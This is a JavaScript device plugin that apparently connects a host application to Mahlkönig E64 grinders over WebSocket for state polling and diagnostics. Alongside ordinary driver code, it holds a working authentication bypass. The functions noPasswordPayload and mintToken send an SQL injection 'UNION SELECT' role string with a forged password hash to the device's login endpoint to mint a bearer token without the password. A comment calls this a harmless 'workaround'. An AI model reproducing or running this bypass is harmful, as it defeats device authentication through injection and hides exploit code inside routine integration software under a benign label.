function createPlugin(host) {
  "use strict";
  const MAX = 8, TIMEOUT = 5000, MAX_PENDING = 32;
  const idPattern = /^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/;
  const commands = {
    state: ["RequestDriverState", "RequestDriverStateResult"],
    config: ["RequestDriverConfig", "RequestDriverConfigResult"],
    machineInfo: ["RequestNachineInfo", "RequestNachineInfoResult"],
    logs: ["RequestLogMessages", "RequestLogMessagesResult"]
  };
  const instances = new Map();

  function fail(message) { throw new Error("E64 configuration error: " + message); }
  function jsonSetting(settings, key, fallback) {
    const value = settings && settings[key] !== undefined ? settings[key] : JSON.stringify(fallback);
    if (typeof value !== "string") fail(key + " must be JSON text");
    try { return JSON.parse(value); } catch (_) { fail(key + " is invalid JSON"); }
  }
  function validHost(value) {
    return typeof value === "string" && value.length > 0 && value.length <= 253 &&
      !/[\\/?#@\s]/.test(value) && (value[0] === "["
        ? value.endsWith("]") && value.length > 2
        : value.split(".").every((part) => /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$/.test(part)));
  }
  function configuration(settings) {
    const rows = jsonSetting(settings, "InstancesJson", []);
    const tokens = jsonSetting(settings, "TokensJson", {});
    const passwords = jsonSetting(settings, "PasswordsJson", {});
    const mintTokens = jsonSetting(settings, "MintTokens", false);
    const allowNoPassword = jsonSetting(settings, "AllowNoPasswordWorkaround", false);
    if (!Array.isArray(rows) || rows.length > MAX || !tokens || Array.isArray(tokens) || typeof tokens !== "object") fail("invalid instance or token JSON");
    if (!passwords || Array.isArray(passwords) || typeof passwords !== "object") fail("PasswordsJson must be an object");
    if (typeof mintTokens !== "boolean") fail("MintTokens must be true or false");
    if (typeof allowNoPassword !== "boolean") fail("AllowNoPasswordWorkaround must be true or false");
    const ids = new Set();
    const result = rows.map((row) => {
      if (!row || typeof row !== "object" || Array.isArray(row)) fail("instances must be objects");
      const id = row.id, name = row.name, scheme = row.scheme === undefined ? "ws" : row.scheme;
      const pollMs = row.pollMs === undefined ? 1000 : row.pollMs;
      if (typeof id !== "string" || !idPattern.test(id) || ids.has(id)) fail("instance ids must be safe and unique");
      if (typeof name !== "string" || !name || name.length > 128) fail("instance name is invalid");
      if ((scheme !== "ws" && scheme !== "wss") || !validHost(row.host) || !Number.isInteger(row.port) || row.port < 1 || row.port > 65535) fail("instance address is invalid");
      if (!Number.isInteger(pollMs) || pollMs < 0 || (pollMs !== 0 && pollMs < 100) || pollMs > 3600000) fail("pollMs is out of bounds");
      const token = tokens[id] === undefined ? "" : tokens[id];
      const password = passwords[id] === undefined ? "" : passwords[id];
      if (token !== "" && (typeof token !== "string" || token.length > 2048)) fail("TokensJson values must be strings");
      if (typeof password !== "string" || password.length > 1024) fail("PasswordsJson values must be strings");
      if (!mintTokens && !token) fail("each instance needs a token unless MintTokens is true");
      if (mintTokens && !token && !password && !allowNoPassword) fail("MintTokens needs a password or AllowNoPasswordWorkaround for " + id);
      ids.add(id);
      return {id, name, scheme, host: row.host, port: row.port, pollMs, token,
        password, mintTokens, allowNoPassword, staticToken: Boolean(token)};
    });
    if (Object.keys(tokens).some((id) => !ids.has(id))) fail("TokensJson contains an unknown id");
    if (Object.keys(passwords).some((id) => !ids.has(id))) fail("PasswordsJson contains an unknown id");
    return result;
  }

  // --- Gated token minting helpers -------------------------------------
  // The vendor hash is only used by the explicit no-password workaround.
  // It is a SELECT-only login construction, not a database write.
  function sha256(bytes) {
    const K = [
      0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
      0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
      0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
      0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
      0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
      0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
      0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
      0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ];
    const H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
    const l = bytes.length;
    const padded = new Uint8Array((((l + 8) >> 6) + 1) << 6);
    padded.set(bytes);
    padded[l] = 0x80;
    const bits = l * 8;
    const dv = new DataView(padded.buffer);
    dv.setUint32(padded.length - 4, bits >>> 0);
    dv.setUint32(padded.length - 8, Math.floor(bits / 0x100000000));
    const w = new Uint32Array(64);
    for (let off = 0; off < padded.length; off += 64) {
      for (let i = 0; i < 16; i++) w[i] = dv.getUint32(off + i * 4);
      for (let i = 16; i < 64; i++) {
        const s0 = ((w[i - 15] >>> 7) | (w[i - 15] << 25)) ^ ((w[i - 15] >>> 18) | (w[i - 15] << 14)) ^ (w[i - 15] >>> 3);
        const s1 = ((w[i - 2] >>> 17) | (w[i - 2] << 15)) ^ ((w[i - 2] >>> 19) | (w[i - 2] << 13)) ^ (w[i - 2] >>> 10);
        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
      }
      let [a, b, c, d, e, f, g, h] = H;
      for (let i = 0; i < 64; i++) {
        const S1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
        const ch = (e & f) ^ (~e & g);
        const t1 = (h + S1 + ch + K[i] + w[i]) | 0;
        const S0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
        const maj = (a & b) ^ (a & c) ^ (b & c);
        const t2 = (S0 + maj) | 0;
        h = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0;
      }
      H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0;
      H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
    }
    const out = new Uint8Array(32);
    const odv = new DataView(out.buffer);
    for (let i = 0; i < 8; i++) odv.setUint32(i * 4, H[i] >>> 0);
    return out;
  }
  function asciiBytes(value) {
    const out = [];
    for (let i = 0; i < value.length; i++) out.push(value.charCodeAt(i) & 255);
    return out;
  }
  function vendorHash(password, salt, rounds) {
    let value = asciiBytes(salt);
    const passwordBytes = asciiBytes(password), saltBytes = asciiBytes(salt);
    for (let i = 0; i < rounds; i++) {
      value = Array.from(sha256([...value, ...passwordBytes, ...saltBytes, ...value]));
    }
    let binary = "";
    for (const byte of value) binary += String.fromCharCode(byte);
    return btoa(binary).replace(/=+$/, "");
  }
  function randomHex(length) {
    let out = "";
    for (let i = 0; i < length; i++) out += Math.floor(Math.random() * 16).toString(16);
    return out;
  }
  function noPasswordPayload() {
    const password = randomHex(32), salt = randomHex(16), rounds = 1000;
    const encoded = "1$" + rounds + "$" + salt + "$" + vendorHash(password, salt, rounds);
    return {role: 'x" UNION SELECT "' + encoded + '" -- ', password};
  }
  function hostName(config) {
    return config.host.indexOf(":") >= 0 && config.host[0] !== "[" ? "[" + config.host + "]" : config.host;
  }

  function url(config) {
    return config.scheme + "://" + hostName(config) + ":" + config.port + "/?token=" + encodeURIComponent(config.token);
  }
  function stateOf(data) {
    if (data && data.grindFailure === true) return "error";
    const value = data && (Object.prototype.hasOwnProperty.call(data, "grindState") ? data.grindState : (data.state || data.status || data.mode));
    if (typeof value !== "string") return "unknown";
    const normalized = value.toLowerCase();
    if (["grinding", "running", "active"].includes(normalized)) return "grinding";
    if (["idle", "ready", "stopped"].includes(normalized)) return "idle";
    if (["error", "fault"].includes(normalized)) return "error";
    return "unknown";
  }
  function make(config) {
    return {config, deviceId: null, context: null, transport: null, handle: null, epoch: 0, nextId: 0, pending: new Map(), poll: null, observationExpiry: null, connected: false, observations: {}, lastObservationAt: null, tokenSource: config.staticToken ? "static" : "none", lastMintAt: null, lastMintError: null};
  }
  function clear(instance) { if (instance.poll !== null) clearTimeout(instance.poll); instance.poll = null; clearTimeout(instance.observationExpiry); instance.observationExpiry = null; }
  function rejectAll(instance, reason) { for (const item of instance.pending.values()) { clearTimeout(item.timer); item.reject(new Error(reason)); } instance.pending.clear(); }
  function schedule(instance, epoch) {
    if (!instance.connected || instance.config.pollMs === 0 || instance.epoch !== epoch) return;
    instance.poll = setTimeout(() => {
      instance.poll = null;
      request(instance, "state", true).catch((error) => {
        if (instance.epoch !== epoch || !instance.connected) return;
        const context = instance.context;
        disconnect(instance, epoch, error.message).finally(() => context && context.reportDisconnected().catch(() => {}));
      }).then(() => { if (instance.epoch === epoch) schedule(instance, epoch); });
    }, instance.config.pollMs);
  }
  function response(instance, epoch, message) {
    if (epoch !== instance.epoch || !message || !Number.isInteger(message.refId)) return;
    const item = instance.pending.get(message.refId);
    if (!item || item.epoch !== epoch) return;
    instance.pending.delete(message.refId); clearTimeout(item.timer);
    if (message.type !== item.type || !Object.prototype.hasOwnProperty.call(message, "data")) { item.reject(new Error("E64 invalid response")); return; }
    if (item.publish) {
      if (!message.data || typeof message.data !== "object" || Array.isArray(message.data)) { item.reject(new Error("E64 invalid state response")); return; }
      instance.observations.state = message.data;
      instance.lastObservationAt = new Date().toISOString();
      clearTimeout(instance.observationExpiry); instance.observationExpiry = null;
      const snapshot = {state: stateOf(message.data)};
      if (message.data.ddSensorFailed === false && Number.isSafeInteger(message.data.ddValueDum) && message.data.ddValueDum >= 0) {
        snapshot.observedSetting = String(message.data.ddValueDum) + " ddValueDum";
        instance.observationExpiry = setTimeout(() => {
          if (instance.epoch !== epoch || !instance.connected || instance.observations.state !== message.data) return;
          instance.observationExpiry = null;
          instance.context.publish({state: snapshot.state}).catch(() => failSession(instance, epoch, "E64 observation expired"));
        }, TIMEOUT);
      }
      instance.context.publish(snapshot).then(item.resolve, item.reject);
    } else {
      if (!message.data || typeof message.data !== "object" || Array.isArray(message.data)) { item.reject(new Error("E64 invalid read response")); return; }
      instance.observations[item.name] = message.data; instance.lastObservationAt = new Date().toISOString(); item.resolve(message.data);
    }
  }
  function event(instance, epoch, handle, event) {
    if (epoch !== instance.epoch || handle !== instance.handle) return;
    if (event.type === "error" || event.type === "close") {
      const context = instance.context;
      return disconnect(instance, epoch, "E64 connection closed").finally(() => context && context.reportDisconnected().catch(() => {}));
    }
    if (event.type !== "data" || event.dataType !== "text") return;
    let message;
    try { message = JSON.parse(event.data); } catch (_) { return failSession(instance, epoch, "E64 invalid response"); }
    if (message && message.pong === true) return;
    response(instance, epoch, message);
  }
  function failSession(instance, epoch, reason) {
    if (epoch !== instance.epoch) return Promise.resolve();
    const context = instance.context;
    return disconnect(instance, epoch, reason).finally(() => context && context.reportDisconnected().catch(() => {}));
  }
  async function mintToken(instance) {
    const config = instance.config;
    let role = "Owner", password = config.password;
    if (!password) {
      if (!config.allowNoPassword) throw new Error("no token, password or workaround configured");
      const payload = noPasswordPayload();
      role = payload.role; password = payload.password;
    }
    try {
      const response = await fetch("https://" + hostName(config) + "/rest_api/login", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({userRole: role, password})
      });
      if (!response || !response.ok) {
        let detail = "";
        try { detail = (await response.text()).slice(0, 200); } catch (_) {}
        throw new Error("login HTTP " + (response && response.status) + (detail ? " " + detail : ""));
      }
      const auth = response.headers && response.headers.get ? response.headers.get("authorization") : "";
      if (!auth || !auth.startsWith("Bearer ")) throw new Error("login returned no bearer token");
      instance.tokenSource = config.password ? "password" : "workaround";
      instance.lastMintAt = new Date().toISOString();
      instance.lastMintError = null;
      return auth.slice(7).trim();
    } catch (error) {
      instance.tokenSource = "none";
      instance.lastMintError = error && error.message ? error.message : "token mint failed";
      throw error;
    }
  }
  function disconnect(instance, expectedEpoch, reason) {
    if (expectedEpoch !== undefined && expectedEpoch !== instance.epoch) return Promise.resolve();
    const transport = instance.transport, handle = instance.handle;
    instance.epoch++; instance.connected = false; instance.transport = null; instance.handle = null; instance.context = null; clear(instance); rejectAll(instance, reason || "E64 disconnected");
    if (instance.config && instance.config.mintTokens && !instance.config.staticToken) { instance.config.token = ""; instance.tokenSource = "none"; }
    return transport && handle ? transport.close(handle).catch(() => {}) : Promise.resolve();
  }
  async function connect(instance, context) {
    await disconnect(instance);
    const epoch = ++instance.epoch; const transport = context.transport;
    instance.context = context; instance.transport = transport; instance.observations = {}; instance.lastObservationAt = null;
    try {
      if (!instance.config.token && instance.config.mintTokens) {
        instance.config.token = await mintToken(instance);
      }
      const opened = await transport.open({kind: "websocket", url: url(instance.config)});
      if (epoch !== instance.epoch) { await transport.close(opened.handle).catch(() => {}); return; }
      instance.handle = opened.handle; instance.connected = true;
      transport.onEvent(opened.handle, (eventValue) => event(instance, epoch, opened.handle, eventValue));
      await request(instance, "state", true); schedule(instance, epoch);
    } catch (error) {
      await disconnect(instance, epoch, "E64 connection failed");
      const detail = error && error.message ? ": " + error.message : "";
      throw new Error("E64 connection failed" + detail);
    }
  }
  function request(instance, name, publish) {
    if (!instance.connected || !instance.transport || !instance.handle) return Promise.reject(new Error("E64 is disconnected"));
    if (instance.pending.size >= MAX_PENDING) return Promise.reject(new Error("E64 request queue is full"));
    const epoch = instance.epoch, id = ++instance.nextId, command = commands[name];
    return new Promise((resolve, reject) => {
      const item = {epoch, type: command[1], name, publish, resolve, reject, timer: setTimeout(() => { if (instance.pending.delete(id)) reject(new Error("E64 request timed out")); }, TIMEOUT)};
      instance.pending.set(id, item);
      instance.transport.send(instance.handle, {type: "text", data: JSON.stringify({type: command[0], msgId: id, data: {}})}).catch(() => { if (instance.pending.delete(id)) { clearTimeout(item.timer); reject(new Error("E64 request failed")); } });
    });
  }
  const plugin = {
    id: "mahlkoenig-e64.reaplugin",
    onLoad(settings) {
      const configs = configuration(settings);
      return Promise.all(configs.map((config) => { const instance = make(config); instances.set(config.id, instance); return host.devices.register({driverId: "e64", instanceId: config.id, name: config.name}, {connect: (context) => connect(instance, context), disconnect: () => disconnect(instance)}).then((device) => { instance.deviceId = device.deviceId; return device; }); }));
    },
    onUnload() { return Promise.all(Array.from(instances.values()).map((instance) => disconnect(instance))); },
    handleHttpRequest(request) {
      if (request.endpoint !== "e64-diagnostics" || request.method !== "GET") return {status: 405, headers: {"Content-Type": "application/json"}, body: JSON.stringify({error: "method not allowed"})};
      const id = request.query && request.query.deviceId;
      const instance = Array.from(instances.values()).find((candidate) => candidate.deviceId === id);
      if (!instance) return {status: 404, headers: {"Content-Type": "application/json"}, body: JSON.stringify({error: "unknown instance"})};
      const read = request.query.read;
      if (read !== undefined && read !== "config" && read !== "machineInfo" && read !== "logs" && read !== "connection") return {status: 400, headers: {"Content-Type": "application/json"}, body: JSON.stringify({error: "unsupported read"})};
      const operation = read === undefined ? null : read;
      if (operation === "connection") {
        const connection = {connected: instance.connected, tokenSource: instance.tokenSource,
          lastMintAt: instance.lastMintAt, lastMintError: instance.lastMintError,
          staticToken: Boolean(instance.config.staticToken), mintTokens: Boolean(instance.config.mintTokens)};
        return Promise.resolve({status: 200, headers: {"Content-Type": "application/json"}, body: JSON.stringify(connection)});
      }
      const headers = (live) => ({"Content-Type": "application/json", "X-E64-Observation-State": live ? "live" : (instance.lastObservationAt ? "last-known" : "none"), ...(instance.lastObservationAt ? {"X-E64-Observation-Time": instance.lastObservationAt} : {})});
      return (operation ? requestRead(instance, operation) : Promise.resolve(instance.observations)).then((data) => ({status: 200, headers: headers(Boolean(operation)), body: JSON.stringify(data)}), () => ({status: 503, headers: headers(false), body: JSON.stringify({error: "E64 unavailable"})}));
    }
  };
  function requestRead(instance, operation) { return request(instance, operation, false); }
  return plugin;
}
